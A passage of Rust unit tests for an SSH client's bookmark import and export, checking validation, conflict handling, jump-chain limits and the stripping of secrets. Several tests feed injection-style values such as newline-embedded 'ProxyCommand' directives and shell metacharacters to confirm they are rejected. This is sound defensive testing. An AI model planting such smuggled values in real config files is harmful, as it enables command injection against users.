                json!({"id":"a","name":"n"}),
                "host",
                ImportInvalidCode::Missing,
            ),
            (json!(5), "", ImportInvalidCode::WrongType),
            (json!(null), "", ImportInvalidCode::WrongType),
            (json!([]), "", ImportInvalidCode::WrongType),
        ];
        for (entry, field, code) in cases {
            let p = parse_import(&doc(json!([]), json!([entry.clone()]))).unwrap();
            assert_eq!(p.valid_bookmarks(), 0, "{entry}");
            assert_eq!(p.invalid.len(), 1, "{entry}");
            assert_eq!(p.invalid[0].field, field, "{entry}");
            assert_eq!(p.invalid[0].code, code, "{entry}");
            assert_eq!(p.invalid[0].index, 0);
            assert_eq!(p.invalid[0].entry, ImportEntryKind::Bookmark);
        }
    }

    #[test]
    fn hostile_groups_and_duplicate_ids() {
        let p = parse_import(&doc(
            json!([{"id":"g1","name":"A"},{"id":"g1","name":"B"},{"id":"g2","name":""},{"id":"g3"},5,{"id":"g 4","name":"x"}]),
            json!([
                {"id":"b1","name":"one","host":"h","groupId":"g1"},
                {"id":"b1","name":"two","host":"h"},
                {"id":"b2","name":"three","host":"h","groupId":"g2"}
            ]),
        ))
        .unwrap();
        assert_eq!(p.groups.len(), 1);
        assert_eq!(
            p.invalid
                .iter()
                .filter(|i| i.entry == ImportEntryKind::Group)
                .count(),
            5
        );
        assert!(
            p.invalid
                .iter()
                .any(|i| i.entry == ImportEntryKind::Group
                    && i.code == ImportInvalidCode::DuplicateId)
        );
        assert_eq!(p.valid_bookmarks(), 1);
        assert!(
            p.invalid
                .iter()
                .any(|i| i.entry == ImportEntryKind::Bookmark
                    && i.index == 1
                    && i.code == ImportInvalidCode::DuplicateId)
        );
        assert!(
            p.invalid
                .iter()
                .any(|i| i.entry == ImportEntryKind::Bookmark
                    && i.index == 2
                    && i.code == ImportInvalidCode::UnresolvedReference)
        );
    }

    #[test]
    fn unknown_fields_dropped_secrets_never_imported_color_lenient() {
        let (dir, mut s) = store();
        let bytes = doc(
            json!([]),
            json!([{
                "id":"a","name":" nas ","host":" nas.example.com ","port":2222,"user":" alice ",
                "auth":{"method":"password","passwordSaved":true,"password":"hunter2",
                        "passwordBinding":{"hostname":"x","port":1,"user":"u"}},
                "password":"hunter2","passphrase":"p","color":"chartreuse","evil":{"a":1},
                "useSshConfig":true,"tags":[" t "],"startDir":" /srv ",
                "uploadLimitKiBps":10,"downloadLimitKiBps":0,"createdAtMs":5
            }]),
        );
        let out = import(&mut s, &bytes, ImportStrategy::Skip);
        assert_eq!(
            (out.added, out.replaced, out.skipped, out.invalid.len()),
            (1, 0, 0, 0)
        );
        let b = s.dto().bookmarks.pop().unwrap();
        assert_eq!(b.name, "nas");
        assert_eq!(b.host, "nas.example.com");
        assert_eq!(b.user.as_deref(), Some("alice"));
        assert_eq!(b.color, None);
        assert_eq!(b.tags, vec!["t".to_owned()]);
        assert_eq!(b.start_dir.as_deref(), Some("/srv"));
        assert_eq!(
            (b.upload_limit_kibps, b.download_limit_kibps),
            (Some(10), Some(0))
        );
        assert_ne!(b.id, "a", "ids are regenerated");
        assert_eq!(b.created_at_ms, 10);
        assert_eq!(
            b.auth,
            AuthConfig::Password {
                password_saved: false
            }
        );
        assert_eq!(s.password_binding(&b.id), None);
        let disk = std::fs::read_to_string(dir.path().join("bookmarks.json")).unwrap();
        for needle in [
            "hunter2",
            "passphrase",
            "evil",
            "chartreuse",
            "passwordBinding",
        ] {
            assert!(
                !disk.contains(needle),
                "{needle} leaked into the store: {disk}"
            );
        }
    }

    #[test]
    fn injection_like_values_cannot_enter_the_store() {
        let (_d, mut s) = store();
        let evil_hosts = [
            "h\nHost *",
            "h\r\nProxyCommand x",
            "a;b",
            "a`b`",
            "$(x)",
            "a|b",
            "a b",
            "[::1]",
            "a/b",
            "a%h",
            "-x",
            "a'b",
            "a\"b",
            "a\\b",
        ];
        let entries: Vec<Value> = evil_hosts
            .iter()
            .enumerate()
            .map(|(i, h)| json!({"id": format!("b{i}"), "name": format!("n{i}"), "host": h}))
            .collect();
        let out = import(
            &mut s,
            &doc(json!([]), Value::Array(entries)),
            ImportStrategy::Skip,
        );
        assert_eq!(out.added, 0);
        assert_eq!(out.invalid.len(), evil_hosts.len());
        assert!(s.dto().bookmarks.is_empty());
        let user_ok = json!({"id":"u","name":"u","host":"h","user":"a@b:c"});
        assert_eq!(
            import(
                &mut s,
                &doc(json!([]), json!([user_ok])),
                ImportStrategy::Skip
            )
            .added,
            1
        );
    }

    #[test]
    fn groups_map_by_name_and_missing_are_created() {
        let (_d, mut s) = store();
        let existing = s
            .group_save(GroupInput {
                id: None,
                name: "Prod".into(),
                order: 0,
            })
            .unwrap();
        let bytes = doc(
            json!([{"id":"g1","name":"prod"},{"id":"g2","name":"Staging"},{"id":"g3","name":"STAGING"}]),
            json!([
                {"id":"a","name":"a","host":"h","groupId":"g1"},
                {"id":"b","name":"b","host":"h","groupId":"g2"},
                {"id":"c","name":"c","host":"h","groupId":"g3"},
                {"id":"d","name":"d","host":"h"}
            ]),
        );
        let out = import(&mut s, &bytes, ImportStrategy::Skip);
        assert_eq!(out.added, 4);
        let dto = s.dto();
        assert_eq!(dto.groups.len(), 2, "Prod reused, Staging created once");
        let staging = dto.groups.iter().find(|g| g.name == "Staging").unwrap();
        let by_name = |n: &str| {
            dto.bookmarks
                .iter()
                .find(|b| b.name == n)
                .unwrap()
                .group_id
                .clone()
        };
        assert_eq!(by_name("a"), Some(existing.id));
        assert_eq!(by_name("b"), Some(staging.id.clone()));
        assert_eq!(by_name("c"), Some(staging.id.clone()));
        assert_eq!(by_name("d"), None);
    }

    #[test]
    fn conflict_strategies() {
        let (_d, mut s) = store();
        let mut i = input("Nas", "old.example.com");
        i.tags = vec!["old".into()];
        let old = s.save(i, 1).unwrap().bookmark;
        let bytes = doc(
            json!([]),
            json!([{"id":"x","name":"nas","host":"new.example.com","tags":["new"]}]),
        );

        let skip = import(&mut s, &bytes, ImportStrategy::Skip);
        assert_eq!(
            (skip.added, skip.replaced, skip.skipped, skip.changed),
            (0, 0, 1, false)
        );
        assert_eq!(s.get(&old.id).unwrap().host, "old.example.com");

        let dup = import(&mut s, &bytes, ImportStrategy::Duplicate);
        assert_eq!((dup.added, dup.skipped), (1, 0));
        let dup2 = import(&mut s, &bytes, ImportStrategy::Duplicate);
        assert_eq!(dup2.added, 1);
        let names: Vec<String> = s.dto().bookmarks.iter().map(|b| b.name.clone()).collect();
        assert!(
            names.contains(&"nas (2)".to_owned()) && names.contains(&"nas (3)".to_owned()),
            "{names:?}"
        );

        let rep = import(&mut s, &bytes, ImportStrategy::Replace);
        assert_eq!((rep.added, rep.replaced), (0, 1));
        let b = s.get(&old.id).unwrap();
        assert_eq!(b.host, "new.example.com");
        assert_eq!(b.tags, vec!["new".to_owned()]);
        assert_eq!(b.created_at_ms, 1, "id and createdAtMs are kept");
        assert_eq!(b.updated_at_ms, 10);
        assert_eq!(rep.replaced_ids, vec![old.id]);
    }

    #[test]
    fn same_name_twice_in_the_file_is_one_import() {
        let (_d, mut s) = store();
        let bytes = doc(
            json!([]),
            json!([bm("a", "dup", "h1"), bm("b", "DUP", "h2")]),
        );
        let out = import(&mut s, &bytes, ImportStrategy::Replace);
        assert_eq!((out.added, out.replaced, out.skipped), (1, 0, 1));
        assert_eq!(s.dto().bookmarks.len(), 1);
    }

    #[test]
    fn replace_keeps_or_forgets_the_saved_password_like_bookmark_save() {
        let (_d, mut s) = store();
        let mut i = input("nas", "nas.example.com");
        i.auth = AuthInput::Password;
        i.user = Some("alice".into());
        let b = s.save(i, 1).unwrap().bookmark;
        s.set_password_saved(
            &b.id,
            Some(PasswordBinding {
                hostname: "nas.example.com".into(),
                port: 22,
                user: "alice".into(),
            }),
            2,
        )
        .unwrap();
        let same = doc(
            json!([]),
            json!([{"id":"x","name":"nas","host":"nas.example.com","user":"alice","auth":{"method":"password"}}]),
        );
        let out = import(&mut s, &same, ImportStrategy::Replace);
        assert!(out.forget_password.is_empty());
        assert!(s.password_binding(&b.id).is_some());
        let moved = doc(
            json!([]),
            json!([{"id":"x","name":"nas","host":"other.example.com","user":"alice","auth":{"method":"password"}}]),
        );
        let out = import(&mut s, &moved, ImportStrategy::Replace);
        assert_eq!(out.forget_password, vec![b.id.clone()]);
        assert_eq!(s.password_binding(&b.id), None);
    }

    #[test]
    fn jumps_between_imported_bookmarks_are_remapped_and_dangling_ones_rejected() {
        let (_d, mut s) = store();
        let bytes = doc(
            json!([]),
            json!([
                {"id":"a","name":"target","host":"t.example.com","proxyJump":{"kind":"bookmark","id":"j"}},
                {"id":"j","name":"jump","host":"j.example.com"},
                {"id":"d","name":"dangling","host":"d.example.com","proxyJump":{"kind":"bookmark","id":"nope"}},
                {"id":"e","name":"via-dangling","host":"e.example.com","proxyJump":{"kind":"bookmark","id":"d"}},
                {"id":"s","name":"spec","host":"s.example.com","proxyJump":{"kind":"spec","spec":"alice@bastion:2222"}}
            ]),
        );
        let out = import(&mut s, &bytes, ImportStrategy::Skip);
        assert_eq!(out.added, 3, "{:?}", out.invalid);
        assert_eq!(out.invalid.len(), 2);
        assert!(out.invalid.iter().all(|i| i.field == "proxyJump" && i.code == ImportInvalidCode::UnresolvedReference));
        let dto = s.dto();
        let id_of = |n: &str| {
            dto.bookmarks
                .iter()
                .find(|b| b.name == n)
                .unwrap()
                .id
                .clone()
        };
        let target = dto.bookmarks.iter().find(|b| b.name == "target").unwrap();
        assert_eq!(
            target.proxy_jump,
            Some(JumpRef::Bookmark { id: id_of("jump") })
        );
        assert!(
            dto.bookmarks
                .iter()
                .all(|b| b.name != "dangling" && b.name != "via-dangling")
        );
    }

    #[test]
    fn jump_cycles_and_self_jumps_are_rejected() {
        let (_d, mut s) = store();
        let bytes = doc(
            json!([]),
            json!([
                {"id":"a","name":"a","host":"a.example.com","proxyJump":{"kind":"bookmark","id":"b"}},
                {"id":"b","name":"b","host":"b.example.com","proxyJump":{"kind":"bookmark","id":"a"}},
                {"id":"c","name":"c","host":"c.example.com","proxyJump":{"kind":"bookmark","id":"c"}},
                {"id":"ok","name":"ok","host":"ok.example.com"}
            ]),
        );
        let out = import(&mut s, &bytes, ImportStrategy::Skip);
        assert_eq!(out.added, 1, "{:?}", out.invalid);
        assert_eq!(out.invalid.len(), 3);
        assert_eq!(s.dto().bookmarks.len(), 1);
    }

    fn chain(n: usize, tail: Option<&str>) -> Vec<u8> {
        let bookmarks: Vec<Value> = (0..n)
            .map(|i| {
                let mut b = bm(
                    &format!("b{i}"),
                    &format!("b{i}"),
                    &format!("h{i}.example.com"),
                );
                let next = if i + 1 < n {
                    Some(format!("b{}", i + 1))
                } else {
                    tail.map(str::to_owned)
                };
                if let Some(id) = next {
                    b["proxyJump"] = json!({"kind": "bookmark", "id": id});
                }
                b
            })
            .collect();
        doc(json!([]), Value::Array(bookmarks))
    }

    /// The worst case of the old fix-up loop (5000 bookmarks, each jumping through the
    /// next, the last one through a missing id) finishes quickly and rejects everything; a valid
    /// 5000-long chain keeps only the bookmarks within the depth limit.
    #[test]
    fn hostile_jump_chain_import_is_bounded() {
        let (_d, mut s) = store();
        let bytes = chain(MAX_IMPORT_BOOKMARKS, Some("missing"));
        let started = std::time::Instant::now();
        let out = import(&mut s, &bytes, ImportStrategy::Skip);
        assert!(
            started.elapsed() < std::time::Duration::from_secs(5),
            "{:?}",
            started.elapsed()
        );
        assert_eq!(out.added, 0);
        assert_eq!(out.invalid.len(), MAX_IMPORT_BOOKMARKS);
        assert!(out.invalid.iter().all(|i| i.field == "proxyJump"));
        assert!(s.dto().bookmarks.is_empty());

        let (_d, mut s) = store();
        let out = import(
            &mut s,
            &chain(MAX_IMPORT_BOOKMARKS, None),
            ImportStrategy::Skip,
        );
        assert_eq!(
            out.added as usize,
            MAX_BOOKMARK_JUMPS + 1,
            "{:?}",
            out.invalid.len()
        );
        assert_eq!(s.dto().bookmarks.len(), MAX_BOOKMARK_JUMPS + 1);
        assert!(
            BookmarkIndex::new(&s.bookmarks, &s.groups)
                .bad_chains()
                .is_empty()
        );
    }

    /// Replacing a bookmark that an existing one jumps through must not push the existing
    /// one's chain past the depth limit; the replacement is rejected (the original stays).
    #[test]
    fn replace_cannot_lengthen_an_existing_chain() {
        let (_d, mut s) = store();
        let mid = s.save(input("mid", "m.example.com"), 1).unwrap().bookmark;
        let mut top = input("top", "t.example.com");
        top.proxy_jump = Some(JumpRef::Bookmark { id: mid.id.clone() });
        s.save(top, 1).unwrap();
        // The file replaces "mid" with one that jumps through a fresh 8-long chain.
        let mut entries: Vec<Value> = (0..MAX_BOOKMARK_JUMPS)
            .map(|i| {
                let mut b = bm(
                    &format!("c{i}"),
                    &format!("c{i}"),
                    &format!("c{i}.example.com"),
                );
                if i + 1 < MAX_BOOKMARK_JUMPS {
                    b["proxyJump"] = json!({"kind": "bookmark", "id": format!("c{}", i + 1)});
                }
                b
            })
            .collect();
        let mut repl = bm("m", "mid", "m2.example.com");
        repl["proxyJump"] = json!({"kind": "bookmark", "id": "c0"});
        entries.push(repl);
        let out = import(
            &mut s,
            &doc(json!([]), Value::Array(entries)),
            ImportStrategy::Replace,
        );
        assert_eq!(out.replaced, 0, "{:?}", out.invalid);
        assert_eq!(out.added as usize, MAX_BOOKMARK_JUMPS);
        let mid_now = s.get(&mid.id).unwrap();
        assert_eq!(mid_now.host, "m.example.com", "original kept");
        assert!(
            BookmarkIndex::new(&s.bookmarks, &s.groups)
                .bad_chains()
                .is_empty()
        );
    }

    /// An import file saved with a UTF-8 BOM is accepted.
    #[test]
    fn import_accepts_a_bom() {
        let mut bytes = b"\xEF\xBB\xBF".to_vec();
        bytes.extend(doc(json!([]), json!([bm("a", "a", "a.example.com")])));
        assert_eq!(parse_import(&bytes).unwrap().bookmarks.len(), 1);
    }

    #[test]
    fn jump_to_an_existing_bookmark_via_skip_maps_to_it() {
        let (_d, mut s) = store();
        let existing = s
            .save(input("bastion", "b.example.com"), 1)
            .unwrap()
            .bookmark;
        let bytes = doc(
            json!([]),
            json!([
                {"id":"x","name":"Bastion","host":"other.example.com"},
                {"id":"y","name":"inner","host":"i.example.com","proxyJump":{"kind":"bookmark","id":"x"}}
            ]),
        );
        let out = import(&mut s, &bytes, ImportStrategy::Skip);
        assert_eq!((out.added, out.skipped), (1, 1));
        let inner = s
            .dto()
            .bookmarks
            .into_iter()
            .find(|b| b.name == "inner")
            .unwrap();
        assert_eq!(
            inner.proxy_jump,
            Some(JumpRef::Bookmark { id: existing.id })
        );
    }

    #[test]
    fn read_only_store_refuses_and_stays_untouched() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("bookmarks.json");
        std::fs::write(&path, br#"{"version":99,"groups":[],"bookmarks":[]}"#).unwrap();
        let before = std::fs::read(&path).unwrap();
        let (mut s, _) = BookmarkStore::load(dir.path());
        assert!(s.read_only());
        let p = parse_import(&doc(json!([]), json!([bm("a", "a", "h")]))).unwrap();
        assert_eq!(
            s.import(p, ImportStrategy::Skip, false, 1)
                .unwrap_err()
                .kind,
            ErrorCode::StorageReadOnly
        );
        assert_eq!(std::fs::read(&path).unwrap(), before);
    }

    #[test]
    fn import_is_one_write_and_nothing_on_nothing_changed() {
        let (dir, mut s) = store();
        s.save(input("a", "h"), 1).unwrap();
        let path = dir.path().join("bookmarks.json");
        let before = std::fs::metadata(&path).unwrap().modified().unwrap();
        let out = import(
            &mut s,
            &doc(json!([]), json!([bm("x", "a", "h")])),
            ImportStrategy::Skip,
        );
        assert!(!out.changed);
        assert_eq!(
            std::fs::metadata(&path).unwrap().modified().unwrap(),
            before
        );
        // A reload sees every imported bookmark and group.
        let out = import(
            &mut s,
            &doc(
                json!([{"id":"g","name":"G"}]),
                json!([{"id":"b","name":"b","host":"h","groupId":"g"},{"id":"c","name":"c","host":"h"}]),
            ),
            ImportStrategy::Skip,
        );
        assert_eq!(out.added, 2);
        let (again, w) = BookmarkStore::load(dir.path());
        assert!(w.is_empty(), "{w:?}");
        assert_eq!(again.dto().bookmarks.len(), 3);
        assert_eq!(again.dto().groups.len(), 1);
    }

    #[test]
    fn export_json_roundtrips_and_has_no_secrets() {
        let (_d, mut s) = store();
        let g = s
            .group_save(GroupInput {
                id: None,
                name: "Prod".into(),
                order: 0,
            })
            .unwrap();
        let mut a = input("web", "web.example.com");
        a.group_id = Some(g.id.clone());
        a.port = Some(2222);
        a.user = Some("alice".into());
        a.tags = vec!["t".into()];
        a.color = Some(BookmarkColor::Red);
        a.auth = AuthInput::Password;
        let a = s.save(a, 1).unwrap().bookmark;
        s.set_password_saved(
            &a.id,
            Some(PasswordBinding {
                hostname: "web.example.com".into(),
                port: 2222,
                user: "alice".into(),
            }),
            2,
        )
        .unwrap();
        let mut b = input("db", "db.example.com");
        b.auth = AuthInput::Key {
            identity_file: "/home/u/.ssh/id_ed25519".into(),
        };
        b.proxy_jump = Some(JumpRef::Bookmark { id: a.id.clone() });
        s.save(b, 3).unwrap();

        let (bytes, count) = export_json(&s.dto(), 1_700_000_000_000);
        assert_eq!(count, 2);
        let text = String::from_utf8(bytes.clone()).unwrap();
        for needle in [
            "passwordSaved",
            "passwordBinding",
            "password\":",
            "passphrase",
            "hunter",
        ] {
            assert!(!text.contains(needle), "{needle}: {text}");
        }
        let v: Value = serde_json::from_slice(&bytes).unwrap();
        assert_eq!(v["format"], "shellfin-bookmarks");
        assert_eq!(v["version"], 1);
        assert_eq!(v["exportedAt"], "2023-11-14T22:13:20Z");
        // Ungrouped bookmarks come first, then the groups in order.
        assert_eq!(v["bookmarks"][0]["name"], "db");
        assert_eq!(v["bookmarks"][1]["auth"], json!({"method":"password"}));

        // Import into a fresh store: same data, new ids, references remapped.
        let (_d2, mut fresh) = store();
        let out = import(&mut fresh, &bytes, ImportStrategy::Skip);
        assert_eq!((out.added, out.invalid.len()), (2, 0));
        let dto = fresh.dto();
        let web = dto.bookmarks.iter().find(|x| x.name == "web").unwrap();
        let db = dto.bookmarks.iter().find(|x| x.name == "db").unwrap();
        assert_ne!(web.id, a.id);
        assert_eq!(
            (web.port, web.user.as_deref(), web.color),
            (Some(2222), Some("alice"), Some(BookmarkColor::Red))
        );
        assert_eq!(
            web.auth,
            AuthConfig::Password {
                password_saved: false
            }
        );
        assert_eq!(dto.groups.len(), 1);
        assert_eq!(web.group_id.as_deref(), Some(dto.groups[0].id.as_str()));
        assert_eq!(
            db.proxy_jump,
            Some(JumpRef::Bookmark { id: web.id.clone() })
        );
    }

    #[test]
    fn ssh_values_are_quoted_and_escaped() {
        assert_eq!(
            ssh_value("host.example.com").as_deref(),
            Some("host.example.com")
        );
        assert_eq!(ssh_value("a b").as_deref(), Some("\"a b\""));
        assert_eq!(ssh_value("a\"b").as_deref(), Some("\"a\\\"b\""));
        assert_eq!(
            ssh_value("C:\\Users\\me").as_deref(),
            Some("\"C:\\\\Users\\\\me\"")
        );
        assert_eq!(ssh_value("a#b").as_deref(), Some("\"a#b\""));
        assert_eq!(ssh_value("-oX").as_deref(), Some("\"-oX\""));
        for bad in [
            "",
            "a\nb",
            "a\rb",
            "a\u{0}b",
            "a\u{7f}b",
            "a\u{85}b",
            "a\u{2028}b",
            "a\tb",
        ] {
            assert_eq!(ssh_value(bad), None, "{bad:?}");
        }
    }

    #[test]
    fn host_aliases_are_safe_and_unique() {
        let mut taken = HashSet::new();
        for (name, want) in [
            ("My Server", "My-Server"),
            ("my server", "my-server-2"),
            ("a*b?c!", "a_b_c_"),
            ("---", "host"),
            ("../x", ".._x"),
            ("Привіт", "host"),
        ] {
            let a = host_alias(name, &taken);
            assert!(
                a.chars()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-')),
                "{a}"
            );
            if name == "my server" || name == "My Server" || name == "---" {
                assert_eq!(a, want);
            }
            taken.insert(a.to_lowercase());
        }
    }

    #[test]
    fn export_ssh_config_blocks() {
        let (_d, mut s) = store();
        let g = s
            .group_save(GroupInput {
                id: None,
                name: "G".into(),
                order: 0,
            })
            .unwrap();
        let mut a = input("web server", "web.example.com");
        a.port = Some(2222);
        a.user = Some("a#b".into());
        a.group_id = Some(g.id);
        a.tags = vec!["x".into()];
        a.start_dir = Some("/srv".into());
        a.color = Some(BookmarkColor::Blue);
        a.upload_limit_kibps = Some(5);
        a.auth = AuthInput::Key {
            identity_file: "C:\\Users\\me\\id 100%".into(),
        };
        let a = s.save(a, 1).unwrap().bookmark;
        let mut b = input("inner", "inner.example.com");
        b.auth = AuthInput::Password;
        b.proxy_jump = Some(JumpRef::Bookmark { id: a.id.clone() });
        s.save(b, 2).unwrap();
        let mut c = input("spec", "c.example.com");
        c.proxy_jump = Some(JumpRef::Spec {
            spec: "bob@jump:2200".into(),
        });
        c.user = Some("ops%u".into());
        s.save(c, 3).unwrap();

        let (text, count, skipped) = export_ssh_config(&s.dto(), 0);
        assert_eq!(count, 3);
        assert!(text.starts_with("# Exported by Shellfin on 1970-01-01T00:00:00Z\n"));
        assert!(
            text.contains(
                "\nHost web-server\n    HostName web.example.com\n    Port 2222\n    User \"a#b\"\n"
            ),
            "{text}"
        );
        assert!(
            text.contains(
                "    IdentityFile \"C:\\\\Users\\\\me\\\\id 100%%\"\n    IdentitiesOnly yes\n"
            ),
            "{text}"
        );
        assert!(text.contains("\nHost inner\n    HostName inner.example.com\n    PreferredAuthentications password,keyboard-interactive\n    ProxyJump web-server\n"), "{text}");
        assert!(text.contains("    ProxyJump bob@jump:2200\n"), "{text}");
        // A literal `%` in User is doubled (OpenSSH expands tokens there).
        assert!(text.contains("    User \"ops%%u\"\n"), "{text}");
        // ... and reads back as the literal user now that User tokens are expanded.
        let fx = crate::sshconfig::testutil::Fixture::new();
        fx.user_config(&text);
        let back = fx.load().query("spec", &fx.env).unwrap();
        assert_eq!(back.user.as_deref(), Some("ops%u"));
        assert!(back.warnings.is_empty(), "{:?}", back.warnings);
        let fields: Vec<&str> = skipped
            .iter()
            .filter(|x| x.name == "web server")
            .map(|x| x.field.as_str())
            .collect();
        for f in ["groupId", "tags", "startDir", "color", "uploadLimitKiBps"] {
            assert!(fields.contains(&f), "{f} not reported: {fields:?}");
        }
        assert!(
            skipped
                .iter()
                .all(|x| x.code == ExportSkipCode::NotRepresentable)
        );
        // Every line is a comment, blank, `Host x`, or an indented directive: nothing smuggled.
        for line in text.lines() {
            assert!(
                line.is_empty()
                    || line.starts_with('#')
                    || line.starts_with("Host ")
                    || line.starts_with("    "),
                "{line:?}"
            );
        }
    }

    #[test]
    fn export_ssh_config_refuses_unsafe_values_instead_of_injecting() {
        // A key path with a newline cannot come from the UI, but a hand-edited store may hold it
        // (only NUL is rejected on load): it must be skipped and reported, never written.
        let evil = "/id\nHost *\n    ProxyCommand x";
        let dto = BookmarksDto {
            bookmarks: vec![Bookmark {
                id: "b1".into(),
                name: "evil".into(),
                host: "h.example.com".into(),
                port: None,
                user: Some("u\u{2028}Host *".into()),
                auth: AuthConfig::Key {
                    identity_file: evil.into(),
                },
                proxy_jump: Some(JumpRef::Spec {
                    spec: "a\nb".into(),
                }),
                group_id: None,
                tags: vec![],
                start_dir: None,
                use_ssh_config: false,
                color: None,
                order: 0,
                upload_limit_kibps: None,
                download_limit_kibps: None,
                confirm_connect: false,
                startup_command: None,
                notes: None,
                created_at_ms: 0,
                updated_at_ms: 0,
            }],
            groups: vec![],
            read_only: false,
        };
        let (text, count, skipped) = export_ssh_config(&dto, 0);
        assert_eq!(count, 1);
        assert!(
            !text.contains("ProxyCommand")
                && !text.contains("Host *")
                && !text.contains('\u{2028}'),
            "{text}"
        );
        let unsafe_fields: Vec<&str> = skipped
            .iter()
            .filter(|x| x.code == ExportSkipCode::UnsafeValue)
            .map(|x| x.field.as_str())
            .collect();
        assert!(
            unsafe_fields.contains(&"auth.identityFile") && unsafe_fields.contains(&"user"),
            "{skipped:?}"
        );
        assert!(skipped.iter().any(|x| x.field == "proxyJump"));
    }
}
